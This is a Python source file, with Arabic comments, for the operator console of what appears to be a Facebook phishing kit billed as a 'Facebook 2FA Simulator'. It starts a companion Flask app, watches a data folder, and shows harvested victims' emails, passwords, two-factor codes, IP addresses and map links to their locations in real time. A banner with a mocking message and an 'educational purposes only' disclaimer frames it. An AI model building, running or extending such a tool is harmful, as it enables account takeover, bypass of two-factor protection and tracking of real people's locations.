import os
import json
import time
import subprocess
import sys
from datetime import datetime
from colorama import init, Fore, Back, Style
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import threading

# تهيئة الألوان في الطرفية
init()

# المجلدات المطلوبة
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))  # مسار المجلد الحالي
DATA_DIR = os.path.join(SCRIPT_DIR, 'data')
UPLOAD_DIR = os.path.join(SCRIPT_DIR, 'upload')

class DataCollector(FileSystemEventHandler):
    def __init__(self):
        # إنشاء المجلدات إذا لم تكن موجودة
        os.makedirs(DATA_DIR, exist_ok=True)
        os.makedirs(UPLOAD_DIR, exist_ok=True)
        
        # تخزين آخر البيانات
        self.current_data = {
            'email': '',
            'password': '',
            'verification_code': '',
            'maps_url': '',
            'ip_address': ''
        }
        
        # Animation variables
        self.animation_frame = 0
        self.dots_count = 0
        
        # Clear screen and show initial display
        self.clear_screen()
        self.show_initial_display()
        
        # Initialize display thread
        self.running = True
        self.display_thread = threading.Thread(target=self.update_display, daemon=True)
        self.display_thread.start()

    def clear_screen(self):
        """Clear the entire screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def move_cursor_up(self, lines):
        """Move cursor up by n lines"""
        sys.stdout.write(f'\x1b[{lines}A')
        sys.stdout.flush()

    def move_cursor_to_start(self):
        """Move cursor to the start of the line"""
        sys.stdout.write('\r')
        sys.stdout.flush()

    def clear_lines(self, count):
        """Clear specified number of lines"""
        for _ in range(count):
            sys.stdout.write('\x1b[2K')  # Clear current line
            sys.stdout.write('\x1b[1A')  # Move up one line
        sys.stdout.write('\x1b[2K')  # Clear the last line
        sys.stdout.flush()

    def show_initial_display(self):
        """Show the initial static display"""
        # Clear screen first
        self.clear_screen()
        
        # Add initial spacing
        print("\n" * 2)
        
        # Print banner with proper spacing
        banner = f"""{Fore.RED}
    ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  {Fore.WHITE}【D E S T R O Y E R】{Fore.RED}
    ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                                         
                                                                                                         {Style.RESET_ALL}

{Style.BRIGHT}{Fore.RED}╔══════════════════════════[ ☠️ DANGER ZONE ☠️ ]══════════════════════════╗
║  {Fore.YELLOW}╔══════════════════════════════════════════════════════════════════╗  {Fore.RED}║
║  {Fore.YELLOW}║  {Fore.WHITE}⚠️  WARNING: THIS IS A POWERFUL AND DANGEROUS TOOL!           {Fore.YELLOW}║  {Fore.RED}║
║  {Fore.YELLOW}║  {Fore.WHITE}⚠️  FOR EDUCATIONAL AND TESTING PURPOSES ONLY!                {Fore.YELLOW}║  {Fore.RED}║
║  {Fore.YELLOW}║  {Fore.WHITE}⚠️  USE AT YOUR OWN RISK - NO WARRANTY PROVIDED!             {Fore.YELLOW}║  {Fore.RED}║
║  {Fore.YELLOW}╚══════════════════════════════════════════════════════════════════╝  {Fore.RED}║
╚═════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

"""
        print(banner)
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.LIGHTRED_EX}[🤡] Sorry Zucky, Your Metaverse Can't Save You Now! v1.0 [🤡]{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[😈] Goodbye Facebook... TikTok is the New King! [😈]{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print("\n" * 2)  # Add extra spacing before data section
        
        # Store the initial cursor position for data updates
        self.banner_height = 20  # Adjusted for new spacing

    def get_waiting_animation(self):
        """Get animated waiting text"""
        dots = "." * ((self.dots_count % 3) + 1)
        spaces = " " * (3 - len(dots))
        return f"Waiting{dots}{spaces}"

    def update_data_display(self):
        """Update only the dynamic part of the display"""
        # Clear previous data display
        print("\033[2J")  # Clear entire screen
        print("\033[H")   # Move cursor to home position
        
        # Print banner again
        self.show_initial_display()
        
        # Get animated waiting text
        waiting_text = self.get_waiting_animation()
        
        # Print data section with clear formatting
        print(f"{Back.BLUE}{Fore.WHITE} COLLECTED DATA {Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Email Address    : {Fore.LIGHTBLUE_EX}{self.current_data['email'] or waiting_text}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Password         : {Fore.GREEN}{self.current_data['password'] or waiting_text}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}2FA Code         : {Fore.RED}{self.current_data['verification_code'] or waiting_text}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Google Maps Link : {Fore.LIGHTBLUE_EX}{self.current_data['maps_url'] or waiting_text}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}IP Address       : {Fore.YELLOW}{self.current_data['ip_address'] or waiting_text}{Style.RESET_ALL}")
        print()
        print(self.create_progress_bar())
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print("\n" * 2)  # Add extra spacing at the bottom

    def create_progress_bar(self):
        """Create animated progress bar"""
        width = 50
        position = self.animation_frame % width
        bar = ["·"] * width
        bar[position] = "■"
        
        colored_bar = ""
        for i, char in enumerate(bar):
            if i == position:
                colored_bar += f"{Fore.LIGHTBLUE_EX}{char}{Style.RESET_ALL}"
            else:
                colored_bar += f"{Fore.BLUE}{char}{Style.RESET_ALL}"
        
        return f"{Fore.WHITE}[{colored_bar}{Fore.WHITE}]{Style.RESET_ALL}"

    def update_display(self):
        """Update display continuously"""
        while self.running:
            self.animation_frame += 1
            self.dots_count = (self.dots_count + 1) % 3
            self.update_data_display()
            time.sleep(0.4)  # Increased to reduce flicker further

    def on_created(self, event):
        if event.is_directory:
            return

        if event.src_path.endswith('.json'):
            self.process_json_file(event.src_path)

    def on_modified(self, event):
        if event.is_directory:
            return

        if event.src_path.endswith('.json'):
            self.process_json_file(event.src_path)

    def process_json_file(self, file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)

            # Update data based on file content
            if 'email' in data:
                self.current_data['email'] = data['email']
            if 'password' in data:
                self.current_data['password'] = data['password']
            if 'verification_code' in data:
                self.current_data['verification_code'] = data['verification_code']
            if 'ip_address' in data:
                self.current_data['ip_address'] = data['ip_address']
            if 'maps_url' in data:
                self.current_data['maps_url'] = data['maps_url']
            elif 'latitude' in data and 'longitude' in data:
                self.current_data['maps_url'] = f"https://www.google.com/maps?q={data['latitude']},{data['longitude']}"

        except Exception as e:
            print(f"\n{Fore.RED}[!] Error processing file: {str(e)}{Style.RESET_ALL}")

def read_output(pipe, prefix):
    """Read process output and filter unwanted messages"""
    try:
        for line in pipe:
            # Skip Flask server startup messages and banner
            if any(skip in line for skip in [
                'Serving Flask app',
                'Debug mode',
                'WARNING: This is a development server',
                'Running on',
                'Press CTRL+C to quit',
                '* Environment:',
                '* Debug mode:',
                'Facebook local server',
                'Open your browser',
                'Monitoring login',
                'Press Ctrl+C'
            ]):
                continue
            print(f"{prefix} {line.strip()}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error reading output: {str(e)}{Style.RESET_ALL}")

def start_monitoring():
    # التأكد من أننا في المجلد الصحيح
    os.chdir(SCRIPT_DIR)
    
    collector = DataCollector()
    observer = Observer()
    observer.schedule(collector, DATA_DIR, recursive=False)
    observer.start()

    try:
        # تشغيل التطبيق مع تحديد المسار الكامل
        minimal_app_path = os.path.join(SCRIPT_DIR, 'minimal_app.py')
        if not os.path.exists(minimal_app_path):
            raise FileNotFoundError(f"Could not find minimal_app.py in {SCRIPT_DIR}")
        
        # تشغيل التطبيق مع إعداد البيئة المناسبة
        env = os.environ.copy()
        env['PYTHONIOENCODING'] = 'utf-8'
        
        app_process = subprocess.Popen(
            [sys.executable, '-u', minimal_app_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=SCRIPT_DIR,
            env=env,
            text=True,
            encoding='utf-8',
            bufsize=1,
            universal_newlines=True
        )
        
        stdout_thread = threading.Thread(target=read_output, args=(app_process.stdout, f"{Fore.GREEN}[OUT]"), daemon=True)
        stderr_thread = threading.Thread(target=read_output, args=(app_process.stderr, f"{Fore.RED}[ERR]"), daemon=True)
        stdout_thread.start()
        stderr_thread.start()
        
        while True:
            time.sleep(0.1)
            if app_process.poll() is not None:
                print(f"\n{Fore.RED}[!] Server process stopped with exit code: {app_process.poll()}{Style.RESET_ALL}")
                try:
                    remaining_stderr = app_process.stderr.read()
                    if remaining_stderr and not any(skip in remaining_stderr for skip in [
                        'Serving Flask app',
                        'Debug mode',
                        'WARNING: This is a development server',
                        'Running on',
                        'Press CTRL+C to quit'
                    ]):
                        print(f"{Fore.RED}[!] Error output:{Style.RESET_ALL}")
                        print(remaining_stderr)
                except Exception as e:
                    print(f"{Fore.RED}[!] Error reading stderr: {str(e)}{Style.RESET_ALL}")
                break
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping server...{Style.RESET_ALL}")
        collector.running = False  # Stop the display thread
        observer.stop()
        if 'app_process' in locals():
            app_process.terminate()
            
        # انتظر لحظة قصيرة
        time.sleep(1)
        
        # تنظيف الشاشة
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # طباعة رسالة الخروج
        print(f"\n{Fore.GREEN}[✓] Server stopped successfully{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] Cleanup completed{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}Thank you for using Facebook 2FA Simulator!{Style.RESET_ALL}\n")
        
        # إنهاء البرنامج بشكل آمن
        sys.exit(0)
        
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        collector.running = False  # Stop the display thread
        if 'app_process' in locals():
            app_process.terminate()
    
    observer.join()

if __name__ == '__main__':
    try:
        start_monitoring()
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        # تنظيف الشاشة في حالة الخطأ
        time.sleep(1)
        os.system('cls' if os.name == 'nt' else 'clear') 